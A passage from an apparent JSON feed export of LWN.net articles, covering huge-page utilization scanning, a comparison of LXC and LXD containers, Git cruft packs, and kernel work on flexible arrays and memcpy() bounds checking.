the hoped-for TLB-related\nperformance improvements will not be realized. \nIn the worst cases, it would clearly make sense to break a poorly utilized\nhuge page back into base pages and only keep those that are clearly in use.\nThe kernel's memory-management subsystem can break up huge pages to, among\nother things, facilitate reclaim, but it is not equipped to focus its\nattention specifically on underutilized huge pages.\n</p><p>\nZhu's patch set aims to fill that gap in a few steps, the first being \nfiguring out which of the huge pages in the system are being fully utilized\n— and which are not.  To that end, a scanning function is run every second\nfrom a kernel workqueue; each run will look at up to 256 huge pages to\ndetermine how fully each is utilized.  Only anonymous huge pages are\nscanned; this work doesn't address file-backed huge pages.\nThe results can be read out of\n<tt>/sys/kernel/debug/thp_utilization</tt> in the form of a table like\nthis:\n</p><p>\n</p><pre>    Utilized[0-50]: 1331 680884\n    Utilized[51-101]: 9 3983\n    Utilized[102-152]: 3 1187\n    Utilized[153-203]: 0 0\n    Utilized[204-255]: 2 539\n    Utilized[256-306]: 5 1135\n    Utilized[307-357]: 1 192\n    Utilized[358-408]: 0 0\n    Utilized[409-459]: 1 57\n    Utilized[460-512]: 400 13\n    Last Scan Time: 223.98\n    Last Scan Duration: 70.65\n</pre>\n<p>\nThis output (taken from the cover letter) is a histogram showing the number\nof huge pages containing a given number of utilized base pages.  The first\nline, for example, shows the number of huge pages for which no more than 50\nbase pages are in active use.  There are 1,331 of those pages, containing\n680,884 unused base pages.  There is a\nclear shape to the results: nearly all pages fall into one of the two\nextremes.  As a general rule, a huge page is either fully utilized or\nalmost entirely unused.\n</p><p>\nAn important question to answer when interpreting this data is: how does\nthe code determine which base pages within a huge page are actually used?\nThe CPU and memory-management unit do not provide much help in this task;\nif the memory is mapped as a huge page, there is no per-base-page \"accessed\" bit\nto look at.  Instead, Zhu's patch scans through the memory itself to see\nwhat is stored there.  Any base pages that contain only zeroes are deemed\nto be unused, while those containing non-zero data are counted as being\nused.  It is clearly not a perfect heuristic; a program could initialize\npages with non-zero data then never touch them again.  But it may be\ndifficult to design a better one that doesn't involve actively breaking\napart huge pages into base pages.\n</p><p>\nThe results of this scanning identify a clear subset of the huge pages in a\nsystem that should perhaps be broken apart.  In current kernels, though,\nsplitting a zero-filled huge page will result in the creation of a lot of\nzero-filled base pages — and no immediate recovery of the unused memory.\nZhu's patch set changes the splitting of huge pages so that it simply drops\nzero-filled base pages rather than remapping them into the process's\naddress space.  Since these are anonymous pages, the kernel will quickly\nsubstitute a new, zero-filled page should the process eventually reference\none of the dropped pages.\n</p><p>\nThe final step is to actively break up underutilized huge pages when the\nkernel is looking for memory to reclaim.  To that end, the scanner will add\nthe least-utilized pages (those in the <tt>0-50</tt> bucket shown above) to\na new linked list so that they can be found \nquickly.    A\nnew shrinker is registered with the memory-management subsystem that can be\ncalled when memory is tight.  When invoked, that shrinker will pull some\nentries from the list of underutilized huge pages and split them, resulting\nin the return of all zero-filled base pages found there to the system.\n</p><p>\nMost of the comments on this patch set have been focused on details rather\nthan the overall premise.  David Hildenbrand <a href=\"https://lwn.net/ml/linux-kernel/00f2dee2-ebc1-e732-f230-bc5b17da9f80@redhat.com/\">expressed\na concern</a> that unmapping zero-filled pages in an area managed by a <a href=\"https://man7.org/linux/man-pages/man2/userfaultfd.2.html\"><tt>userfaultfd()</tt></a>\nhandler could create confusion if that handler subsequently receives page\nfaults it was not expecting.  Zhu <a href=\"https://lwn.net/ml/linux-kernel/A92C4953-F9BC-4687-BB03-2202D94D6F5D@fb.com/\">answered</a>\nthat, if this is a concern, zero-filled base pages in\n<tt>userfaultfd()</tt>-managed areas could be mapped to the kernel's shared\nzero page instead.\n</p><p>\nThe kernel has supported transparent huge pages since the feature was <a href=\"https://lwn.net/Articles/423584/\">merged</a> into the 2.6.38 kernel in 2011, but it\nis still not enabled for all processes.  One of the reasons for\nholding back is the internal-fragmentation problem, which can outweigh the\nbenefits that transparent huge pages provide.  Zhu's explicit goal is to\nmake that problem go away, allowing the enabling of transparent huge pages\nby default.  If this work is successful, it could represent an important\nstep for a longstanding kernel feature that, arguably, has never quite\nlived up to its potential.<br clear=\"all\"></p><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Kernel/Index\">Kernel</a></td><td><a href=\"https://lwn.net/Kernel/Index#Huge_pages\">Huge pages</a></td></tr>\n            <tr><td><a href=\"https://lwn.net/Kernel/Index\">Kernel</a></td><td><a href=\"https://lwn.net/Kernel/Index#Memory_management-Huge_pages\">Memory management/Huge pages</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "907613",
    "timestampUsec": "1663089239624421",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "LXC and LXD: a different container story",
    "author": ";jake",
    "published": 1663089000,
    "updated": 1663089000,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/907613/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           <p>September 13, 2022</p>\n           <p>This article was contributed by Jordan Webb</p>\n           </div>\n<p><a href=\"https://lwn.net/Articles/902049/\">OCI containers</a> are the most popular type\nof Linux container, but they are not the only type, nor were they the\nfirst.  <a href=\"https://linuxcontainers.org/\">LXC</a> (short for \"LinuX\nContainers\")  predates Docker by several years, though it was also not the\nfirst.  LXC dates back to its first release in 2008; the <a href=\"https://github.com/moby/moby/tree/v0.1.0\">earliest version of\nDocker</a>, which was tagged in 2013, was actually a wrapper around LXC.\nThe LXC project is still going strong and shows no signs of winding\ndown; <a href=\"https://discuss.linuxcontainers.org/t/lxc-5-0-lts-has-been-released/14381\">LXC 5.0</a> was released in July and comes with a promise of support until\n2027.  </p>\n\n<h4>LXC</h4>\n\n<p>LXC was initially developed by IBM, and was part of a <a href=\"https://lore.kernel.org/all/44242A3F.1010307@sw.ru/\">collaboration\nbetween several parties</a> looking to add namespaces to the kernel.\nEventually, \nCanonical took over stewardship of the project, and now hosts its\ninfrastructure and employs many of its maintainers.  The project includes a\nC library called <tt>liblxc</tt> and a collection of command-line tools\nbuilt on top of it that can be used to create, interact with, and destroy\ncontainers.  LXC does not provide or require a daemon to manage containers;\nthe tools it includes act directly on container processes.  </p>\n\n<p>LXC was the first container implementation to be built\nentirely on capabilities found in the mainline kernel; predecessors\nrequired out-of-tree patches to work.  Like Docker, LXC containers are\ncreated using a combination of <a href=\"https://man7.org/linux/man-pages/man7/cgroups.7.html\">control\ngroups</a> and <a href=\"https://lwn.net/Articles/531114/\">namespaces</a>.  Because LXC was\ndeveloped in parallel with the effort to add namespaces to the kernel, it\ncould be considered a sort of reference implementation of using namespaces\nfor containers on\nLinux.  </p>\n\n<p>Unlike Docker, LXC does not presume to espouse an opinion about what\nkinds of\nprocesses should run in a container.  By default, it will try to launch an\ninit system inside of the container, which can then launch other processes\n— something that is <a href=\"https://zauner.nllk.net/post/0038-running-systemd-inside-a-docker-container/\">notoriously\nhard</a> to do in a Docker container. \nWith the correct configuration, though, it is even possible to run LXC\ncontainers \nnested within another LXC container, or to run the Docker daemon instead of\nan LXC container.  </p>\n\n<p>LXC containers are defined using a <a href=\"https://linuxcontainers.org/lxc/manpages/man5/lxc.container.conf.5.html\">configuration\nfile</a>, which offers a great deal of control over how the container is\nconstructed.  \nThe <a href=\"https://linuxcontainers.org/lxc/manpages//man1/lxc-create.1.html\"><tt>lxc-create</tt></a>\nutility is used to create containers.\nLXC does not bundle container configurations and images\ntogether; instead, the container configuration specifies\na directory or block device\nto use for\nthe container's root filesystem. LXC can use an existing root filesystem,\nor <tt>lxc-create</tt> can construct one on the fly using a template. \n</p>\n\n<p>\nAn LXC\ntemplate is a shell script that \nconstructs a root filesystem using a few key variables that\n<tt>lxc-create</tt> replaces before the template is run.  A handful of\ntemplates are included; among them is an <a href=\"https://github.com/lxc/lxc/blob/master/templates/lxc-oci.in\">OCI\ntemplate</a> that uses SUSE's <a href=\"https://umo.ci/\">umoci</a> utility to\ndownload and unpack a container image from an OCI container registry, which\ngives LXC the ability to run all of the same containers that Docker and other\nOCI runtimes can.  </p>\n\n<p>A <a href=\"https://github.com/lxc/lxc-templates/\">separate collection of\ntemplates</a> that can build root filesystems for a variety of popular\ndistributions is available, but this approach has fallen out of favor\nbecause the tools that these templates use often require root privileges.\nThese days, pre-built images are preferred because they can more easily be\nused by unprivileged users.  \n</p>\n\n<p>\nThe LXC project has developed a tool called <a href=\"https://linuxcontainers.org/distrobuilder/introduction/\"><tt>distrobuilder</tt></a>\nto create these pre-built images, which are made\navailable on an <a href=\"https://us.lxd.images.canonical.com/\">image\nserver</a> hosted by Canonical.  The <a href=\"https://github.com/lxc/lxc/blob/master/templates/lxc-download.in\"><tt>lxc-download</tt></a>\ntemplate can be used to create a container based on an image from an image\nserver.  \n</p>\n\n<p>\nIn theory, anybody can host their own image server, but in\npractice, few seem to do so, at least in public.  There does not appear to\nbe a large \nlibrary of pre-packaged applications in this format like a user of Docker\nor Helm might be accustomed to.  Canonical's image server only contains\nbase images for an assortment of distributions; any additional software\nmust be bundled into a custom image, or installed using the package manager\ninside the container.  </p>\n\n<p>Among the various options for running containers on Linux, LXC appears\nto be the most flexible.  It comes with reasonable defaults, but it\nmakes no effort to hide the complexity of creating a container from the\nuser; every detail of the containers that it creates can be customized and\nadjusted to taste.  Docker has found much popularity in papering over these\ndetails, but at the cost of flexibility compared to LXC.  </p>\n\n<h4>LXD</h4>\n\n<p><a href=\"https://linuxcontainers.org/lxd/introduction/\">LXD</a> is a\nmore specialized sister (or perhaps daughter) project of LXC; its\ndevelopment is also sponsored by Canonical.  LXD was initially released\nin 2015; <a href=\"https://discuss.linuxcontainers.org/t/lxd-5-5-has-been-released/14899\">version 5.5</a>\ncame out in August.  Like LXC, LXD also has long-term support\nbranches; the most recent long-term support release is <a href=\"https://discuss.linuxcontainers.org/t/lxd-5-0-lts-has-been-released/13723\">LXD 5.0.x</a>, which\nwill be supported until 2027.  As might be inferred from the name, \nLXD includes a daemon, which is built on top of <tt>liblxc</tt>.  </p>\n\n<p>LXD does away with LXC's template system in favor of being purely\nimage-based.  Because of this, Docker container images cannot be used with\nLXD — there is no LXD equivalent to LXC's OCI template.  LXD uses the same\nimage servers as the <tt>lxc-download</tt> template but requires a\ndifferent image format; <tt>distrobuilder</tt> contains support for\nbuilding images \nof <a href=\"https://distrobuilder.readthedocs.io/en/latest/building/\">both\ntypes</a> (as well as plain .tar.gz images), though, and Canonical's image\nserver carries both LXC and LXD versions of all of the images it hosts.  </p>\n\n<p>Like the Docker daemon, LXD is controlled by an <a href=\"https://linuxcontainers.org/lxd/rest-api/\">API</a> based on HTTP.\nLXD also comes with a command-line client using this API called\n<tt>lxc</tt> (not \nto be confused with the tools that come with LXC, which are named\n<tt>lxc-*</tt>).  Also like Docker, LXD can listen on a UNIX socket, and in\nthis mode, authentication is largely-nonexistent; access to the API socket\nis controlled using filesystem permissions.\n</p>\n\n<p>\nAs part of its <a href=\"https://ubuntu.com/landscape\">Landscape</a> suite\nof server-management tools, Canonical offers a <a href=\"https://landscape.canonical.com/static/doc/api/accesscontrol.html\">role-based\naccess control (RBAC) service</a> that LXD can integrate with for more\nfine-grained access control.  Landscape is only free for <a href=\"https://ubuntu.com/landscape/pricing\">personal use or evaluation\npurposes</a>, though; enterprises that want the additional security\ncontrols provided by this feature must subscribe to Canonical's <a href=\"https://ubuntu.com/advantage\">Ubuntu Advantage</a> service.  </p>\n\n<p>LXD can also be used to <a href=\"https://linuxcontainers.org/lxd/docs/master/virtual-machines/\">run virtual\nmachines</a>.  Working with virtual machines in LXD is more-or-less\nidentical to working with containers, and the same images can be used for\nboth; all that needs to be done to create a VM is to pass the <tt>--vm</tt>\nflag to the <tt>lxc create</tt> command (once again, not to be confused\nwith the <tt>lxc-create</tt> command from LXC).  LXD uses <a href=\"https://en.wikipedia.org/wiki/Kernel-based_Virtual_Machine\">KVM</a> and the <a href=\"https://www.qemu.org/\">QEMU</a> emulator to run its virtual machines.\n</p> \n\n<p>Several hosts running LXD can be <a href=\"https://linuxcontainers.org/lxd/docs/master/clustering/\">combined\ninto a cluster</a>.  LXD cluster nodes\ncoordinate \nwith each other \nusing a protocol based \non the <a href=\"https://raft.github.io/\">Raft</a> consensus algorithm,\nmuch like some \n<a href=\"https://lwn.net/Articles/905164/\">OCI container\norchestrators</a> do.\nContainers and virtual machines can be launched on a specific cluster node,\nor jobs can be distributed to arbitrary <a href=\"https://linuxcontainers.org/lxd/docs/master/clustering/#cluster-groups\">groups</a>\nof nodes.  Like Swarm and Kubernetes, LXD bridges cluster networks between\nnodes so that containers or VMs running on different nodes can communicate\nwith each other.  </p>\n\n<p>LXD is an interesting project; the set of features it offers would seem\nto make it a viable alternative to Swarm or Kubernetes, but for the lack of\ncompatibility with OCI containers.  This seems like a curious oversight;\nLXC's OCI template demonstrates that it should be possible, and LXD appears\nto have everything else it would need to compete in that arena, but its\ndevelopers <a href=\"https://discuss.linuxcontainers.org/t/using-oci-templates-in-lxd/1911/6\">are\nnot interested in competing in that arena</a>.  As it stands, LXD has\ndeliberately \nlimited its audience to the set of people interested in running system\ncontainers or virtual machines.  The tools that it offers to its chosen\naudience are \npowerful; people who are weary of struggling with configuring other\nvirtual-machine managers would be well-advised to have a look at LXD.  </p> \n\n<h4>Conclusion</h4>\n\n<p>The Linux Containers project as a whole seems healthy, with\ncommitted maintainers backed by a corporate sponsor, regular releases, and\nlong-term support.  LXC offers a mature and stable set of tools, while LXD\noffers a more \"modern\" feeling user interface to the same technology, and\nthrows in virtual machines and clustering for good measure.  LXC can be\nmade to run OCI containers, but LXD cannot; people who are deeply immersed\nin the world of OCI might be better-served looking for something more\nfirmly rooted in that ecosystem.  For people looking for a different kind\nof container, though, LXC and LXD are both solid options.  </p><br clear=\"all\"><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Archives/GuestIndex/\">GuestArticles</a></td><td><a href=\"https://lwn.net/Archives/GuestIndex/#Webb_Jordan\">Webb, Jordan</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "908035",
    "timestampUsec": "1663181145668427",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Scaling Git’s garbage collection (GitHub blog)",
    "author": ";corbet",
    "published": 1663177860,
    "updated": 1663177860,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/908035/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "The GitHub blog has <a href=\"https://github.blog/2022-09-13-scaling-gits-garbage-collection/\">a\ndetailed look at garbage collection in Git</a> and the work that has been\ndone to make it faster.\n<p>\n</p><blockquote>\n\tTo solve this problem, we turned to a long-discussed idea on the\n\tGit mailing list: cruft packs. The idea is simple: store an\n\tauxiliary list of <tt>mtime</tt> data alongside a pack containing\n\tjust unreachable objects. To garbage collect a repository, Git\n\tplaces the unreachable objects in a pack. That pack is designated\n\tas a “cruft pack” because Git also writes the <tt>mtime</tt> data\n\tcorresponding to each object in a separate file alongside that\n\tpack. This makes it possible to update the <tt>mtime</tt> of a\n\tsingle unreachable object without changing the <tt>mtimes</tt> of\n\tany other unreachable object.\n</blockquote><br clear=\"all\"><table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "908817",
    "timestampUsec": "1663888403691301",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Safer flexible arrays for the kernel",
    "author": ";jake",
    "published": 1663886700,
    "updated": 1663886700,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/908817/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           By <b>Jake Edge</b><br>September 22, 2022\n           <hr>\n<a href=\"https://lwn.net/Archives/ConferenceByYear/#2022-Linux_Security_Summit_Europe\">LSS EU</a>\n</div>\n<p>\nAt the 2022 <a href=\"https://events.linuxfoundation.org/linux-security-summit-europe/\">Linux\nSecurity Summit Europe</a> (LSS EU), Gustavo A. R. Silva reported in on\nwork he has been doing on \"flexible\" arrays in the kernel.  While these\narrays provide some ... flexibility ... they are also a source of bugs,\nwhich \ncan often result in security vulnerabilities.  He has been working on ways\nto make the use of flexible arrays safer in the kernel.\n</p>\n\n<p>\nSilva has a background in embedded systems, working with both realtime\noperating systems (RTOS) and embedded Linux. For the last six years, he has \nhas been working as an\nupstream kernel engineer.   He collaborates with the <a href=\"https://kernsec.org/wiki/index.php/Kernel_Self_Protection_Project\">Kernel\nSelf Protection\nProject</a> (KSPP) and the Linux kernel division of the Google open-source \nsecurity team.\n</p>\n\n<h4>Trailing and flexible arrays</h4>\n\n<p>\nHe began with an introduction to C arrays, starting with the simplest,\n<tt>int happy_array[10];</tt>, which declares an array holding ten\nelements of type <tt>int</tt> that can be indexed using the values zero to\nnine. <tt>happy_array</tt> is \"going to remain happy as long as we access\nit within its boundaries\".  But C does not enforce those limits, so\ndevelopers must do so; if they do not, they end up in what he likes to call\n\"The Land of Possibilities\", also known as undefined behavior.\n</p>\n\n<p>\nA \"trailing\" array is one that is declared as the last field in a\nstructure.  They can have a concrete size, as with <tt>happy_array</tt>, or\nthey can represent a \"blob\" of data that is tacked onto the structure at\nrun time.  For example:\n</p><pre>    struct blob_holder {\n        ...\n        size_t count;\n        unsigned char blob[];\n    }\n</pre>\n<p></p>\n\n<p></p>\nTypically, some element in the structure holds the length of the blob, such\nas <tt>count</tt> here. In this way, trailing arrays are used to build\nvariable-length objects (VLOs) in C. \nSo a flexible array is simply a trailing array used as a VLO; its size is\ndetermined at run time.  A flexible structure is a <tt>struct</tt> that\ncontains a flexible array as its last element.\nThere are three ways to declare flexible arrays, Silva said.  Two of those\nare designated as \"fake\" flexible arrays because they do not use the C99\nempty-bracket declaration (i.e. \"true\" flexible arrays) as above.  Many of\nthose fake uses predate C99 \nentirely and they declare either zero- or one-element arrays to use as\nflexible arrays. This usage leads to bugs.\n<p></p>\n\n<p>\nDeclaring a one-element flexible array is a \"buggy hack\".  The problem is\nthat the single element is counted toward the size of the array (and\nenclosing structure), which can\neasily lead to off-by-one errors.  The count field in the structure is one\nlarger than what should be allocated, so <tt>count - 1</tt> needs\nto be used consistently.  When analyzing existing code that uses flexible\nstructures of that sort, one must always consider the uses of\n<tt>sizeof()</tt> for the array and structure.  Often that analysis will find\nexisting off-by-one and other bugs in the code.\n</p>\n\n<p>\nA zero-element fake flexible array is a GNU extension that was added to work\naround the lack of true flexible arrays in the language at that time.  They\nare somewhat less buggy than the one-element arrays, since they do not\ncontribute to the size of the enclosing structure.  True flexible arrays\nmust appear last in the structure, which is enforced by the compiler.\nEither of the fake flexible array variants can appear anywhere in a\nstructure, though, which can lead to other kinds of problems, of course.\n</p>\n\n<h4>Problems</h4>\n\n<p>\nThe <tt>sizeof()</tt> operator returns different values for the three\nvariants.  For the one-element variant, the array's size is that of one\nelement of the\ntype of the array; it is zero for the zero-element variant.  But for true\nflexible arrays, <tt>sizeof()</tt> gives a compile-time error because the\nsize is not known.\n</p>\n\n<a href=\"https://lwn.net/Articles/909132/\">\n<img src=\"https://static.lwn.net/images/2022/lsseu-silva-sm.png\" border=\"0\" hspace=\"5\" align=\"left\" alt=\"[Gustavo A. R. Silva]\" title=\"Gustavo A. R. Silva\" width=\"195\" height=\"280\"> \n</a>\n\n<p>\nThe first flexible-array-transformation <a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=76497732932f\">fix</a>\nthat he did as part of his KSPP work shows the kind of problem  that can\nstem from fake flexible \narrays.  A \nzero-length array was declared at the end of a structure, but later someone\n<a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=e48f129c2f20\">added\na field for read-copy-update</a> (RCU) <i>after</i> the flexible array. \nThe compiler did not complain, so the bug persisted from 2011 until he\nfixed it in 2019.  He used a true flexible array declaration (and moved it\nto the end); now if someone adds a new structure member at the end, the\ncompiler will \nreport an error.\n</p>\n\n<p>\nThere has been an effort to enable array-bounds checking in the compiler\nwith the <tt>-Warray-bounds</tt> option, but the fake flexible\narrays were causing too many false-positives (along with finding some real\nbugs). \nIt is not uncommon for a flexible array to be indexed directly with a value\nthat is\nbeyond the \"end\" of the array.  Those needed to be fixed before bounds\nchecking could be turned on.\n</p>\n\n<p>\nHe <a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c1e4726f465440\">fixed</a>\na simple example in mid-2021.  A one-element array was being accessed with\n<tt>[1]</tt>, which is obviously one element too far; changing it to a true\nflexible array got rid of the warning. Others are bit <a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=39107e8577ad\">more\nelaborate</a>, but boil down to a switch to a true flexible array; removing\nthe one-element array also got rid of a few <tt>count - 1</tt>\ncalculations for allocation sizes.\n</p>\n\n<p>\nFlexible arrays can be the source or target of <tt>memcpy()</tt> operations\nand it would be nice to have them participate in the <a href=\"https://lwn.net/Articles/864521/\">hardened <tt>memcpy()</tt> effort</a>.  When\n<tt>CONFIG_FORTIFY_SOURCE</tt> is enabled for the kernel, <tt>memcpy()</tt>\nuses the <a href=\"https://gcc.gnu.org/onlinedocs/gcc/Object-Size-Checking.html\"><tt>__builtin_object_size()</tt>\nfunction</a> (with a <tt>type</tt> argument of 1) to calculate the sizes\nof the source and destination at run time.  \n</p>\n\n<p>\nFor true flexible arrays, though, that function\nreturns -1 because it cannot determine the size.  Fake\nflexible arrays <i>do</i> have a size, but it turns out that\n<tt>__builtin_object_size()</tt> still returns -1 for those.  Combining\nthat with the behavior of <tt>sizeof()</tt> makes things all a bit\nconfusing as he showed in his <a href=\"https://static.sched.com/hosted_files/lsseu2022/5e/lsseu2022_flex_array_transformations.pdf\">slides</a>:\n</p><pre>    __builtin_object_size(flex_struct-&gt;one_element_array, 1) == -1\n    __builtin_object_size(flex_struct-&gt;zero_length_array, 1) == -1\n    __builtin_object_size(flex_struct-&gt;flex_array_member, 1) == -1\n\n    sizeof(flex_struct-&gt;one_element_array) == size-of-element-type\n    sizeof(flex_struct-&gt;zero_length_array) == 0\n    sizeof(flex_struct-&gt;flex_array_member) == ? /* Error */\n</pre>\n<p></p>\n\n<p>\nBecause <tt>__builtin_object_size()</tt> cannot\ndetermine a size for trailing arrays, no bounds checking is done in\n<tt>memcpy()</tt> (with <tt>CONFIG_FORTIFY_SOURCE</tt>) for those arrays\ntoday.\nWhat's even stranger, perhaps, is that <tt>__builtin_object_size()</tt>\nreturns -1 for <i>any</i> trailing array, even if it has a specified\nsize greater than one.  Because <tt>__builtin_object_size()</tt> does not\nreturn a size for trailing arrays, even those that it ostensibly could\ndetermine, no bounds checking is done in\n<tt>memcpy()</tt> (with <tt>CONFIG_FORTIFY_SOURCE</tt>) for those arrays\ntoday.  The reason for this <tt>__builtin_object_size()</tt>  behavior is\nlegacy code that declares trailing arrays \nwith a fixed length—but treats them as flexible arrays. He showed a BSD\nversion of <tt>struct sockaddr</tt> with a trailing array,\n<tt>char sa_data[14]</tt>, that can actually hold up to 255 bytes at\nrun time.\n</p>\n\n<p>\nIn order to allow <tt>memcpy()</tt> to do sanity checking on trailing\narrays, this ambiguity in declarations for flexible arrays needs to be\neliminated. All arrays that are meant to be used as flexible arrays should\nbe declared as true flexible arrays using <tt>[]</tt>; then, compilers can\nbe instructed to treat fixed-length \ntrailing arrays as regular fixed-length arrays. He pointed to a <a href=\"https://gcc.gnu.org/bugzilla/show_bug.cgi?id=101836\">GCC bug\nreport</a> for a compiler change to address the problem.\n</p>\n\n<h4>Compiler flag</h4>\n\n<p>\nThere is a new compiler flag in the upcoming GCC 13 and Clang 16\nreleases \nthat will \nallow developers to set the level of strictness for flexible arrays:\n<tt>‑fstrict‑flex‑arrays[=n]</tt> (often abbreviated as\n<tt>-fsfa</tt>). \nThe default setting for <tt>n</tt> is 0, which means no change from\ntoday and all trailing arrays are treated as flexible by\n<tt>__builtin_object_size()</tt>.  Values of \n<tt>n</tt> from 1 to 3 increase the strictness of enforcement by\nchanging the behavior of  <tt>__builtin_object_size()</tt>:\n</p><ul>\n\n<li><b><tt>-fsfa=1</tt></b>: only trailing arrays that are declared with\n<tt>[1]</tt>, <tt>[0]</tt>, and <tt>[]</tt> are \ntreated as flexible arrays; <tt>__builtin_object_size()</tt> returns the\nproper length for others.\n\n</li><li><b><tt>-fsfa=2</tt></b>: only trailing arrays that are declared with\n<tt>[0]</tt> and <tt>[]</tt> are  \ntreated as flexible arrays; <tt>__builtin_object_size()</tt> returns the\nproper length for others.\n\n</li><li><b><tt>-fsfa=3</tt></b>: only trailing arrays that are declared with\n<tt>[]</tt> are \ntreated as flexible arrays; <tt>__builtin_object_size()</tt> returns the\nproper length for any with a concrete size.\n\n</li></ul>\n<p></p>\n\n<p>\nUnfortunately, the Clang developers have not (yet?) been convinced to add\n<tt>-fsfa=3</tt>; there is an ongoing discussion about it, Silva\nsaid.  The work to transform the flexible arrays in the kernel to true\nflexible arrays had been going on for several years and there is still more\nto do.  Transforming uses of zero-element arrays is fairly straightforward,\nbut one-element arrays are more difficult to transform because they require\nmore code inspection to look for off-by-one problems.  Once that is done,\nand the compilers are available, <tt>memcpy()</tt> will be able to bounds-check\nall trailing (non-flexible) arrays, so all arrays of fixed size will\nfinally be bounds-checked in the kernel.\n</p>\n\n<p>\nSo there is a path toward getting all of those arrays bounds-checked, what\nabout checking for actual flexible arrays?  It is a more challenging case,\nSilva said,\nbut there are proposals for ways to handle it. The key is to identify the\nstructure member that holds the length of the array.  That could be done\nwith an attribute on the array like the following:\n</p><pre>    struct bounded_flex_struct {\n\t...\n\tsize_t elements;\n\tstruct foo flex_array[]\n\t  __attribute__((__element_count__(elements)));\n    };\n</pre>\n<p></p>\n\n<p>\nThere are some user-space API issues to work out, however, when switching\nfrom one-element flexible arrays to true flexible arrays.  The first\nattempt at supporting both the existing API and the new way of doing\nthings duplicated the fields in user-facing \nstructures and placed them inside a <tt>union</tt> so\nthat user space could use the array one way and the kernel could use it the\nother: \n</p><pre>    struct farray {\n        union {\n            struct {\n                ... /* renamed versions of the members */\n                size_t renamed_count;\n                int orig_array_name[1];\n            };\n            struct {\n                ... /* members with existing names */\n                size_t count;\n                int orig_array_name_flex[];\n            };\n        };\n    };\n</pre>\n<p></p>\n\n<p>\nDoing that caused a lot of code churn, so the\n<tt>__DECLARE_FLEX_ARRAY()</tt> helper macro was added that would go in a\nunion that just contained the arrays:\n</p><pre>    struct farray {\n        ...\n        size_t count;\n        union {\n            int orig_array_name[1];\n            __DECLARE_FLEX_ARRAY(int, orig_array_name_flex);\n        };\n    };\n</pre>\nIn both cases, user space will continue to use <tt>orig_array_name</tt>,\nwhile the kernel will use <tt>orig_array_name_flex</tt>.  One thing to note\nis that the size of the structure does not change; the one-element array\nwill still contribute to the size of the structure.\n<p></p>\n\n<h4>Status, conclusions, and questions</h4>\n\n<p>\nAt this point, most of the zero-length arrays in the kernel have been\ntransformed, including handling any user-space API issues.  But there is\nnothing stopping \nnew ones from being added, so he asked kernel developers not to introduce\nnew uses.  Transformations for one-element arrays are still a work in\nprogress; that work is more challenging and there is a need to ensure that\nthe maintainers of the code being changed feel comfortable that the changes\nhave not broken anything. To that end, he is using a variety of\n<tt>diff</tt>-like tools to try to verify that no significant changes have\nbeen made by the transformation process. \n</p>\n\n<p>\nIt is important to turn all of the kernel uses of flexible arrays into true\nflexible arrays—and then to ensure that no new uses of zero- or one-length\nflexible arrays are added, he reiterated.  The security of the kernel can\nbe significantly \nimproved with <tt>‑fstrict‑flex‑arrays=3</tt>, which\nmeans it is important \nto convince the Clang developers to support that setting.  \nThis work has already found vulnerabilities in the kernel and will surely\nfind more as it progresses.  It is going to take some time but there is a\nclear vision of how we get to the point where all trailing arrays,\nfixed-size or flexible, will be bounds-checked in <tt>memcpy()</tt>. \n</p>\n\n<p>\nSilva took a few comments and questions at the end of the talk. LSS EU\norganizer Elena Reshetova noted that when the conversion from\n<tt>atomic_t</tt> to <tt>recount_t</tt> was done, those developers faced a\nsimilar problem with stopping developers from adding new uses of the types\nthey were trying to convert.  They ended up integrating a test into the\n<a href=\"https://01.org/lkp/documentation/0-day-brief-introduction\">0-day\ntest robot</a> to catch those introductions and send email.  That worked\nwell and she encouraged Silva to try something like that.\n</p>\n\n<p>\nI asked what reasons the Clang developers had for opposing the strictest\nsetting on the new compiler flag. Silva said that their position is \"just\ndon't use zero-length arrays\" but he deferred to Kees Cook, who said he\ncould speak to the \"minutiae of that\".  The Clang folks point out that\nzero-length arrays are not legal C, according to the standard, so if the\nGNU extension allowing them is removed, zero-length arrays do not exist so\nthe <tt>=2</tt> level is sufficient.  Adding another option to support\nhaving zero-length arrays that are not 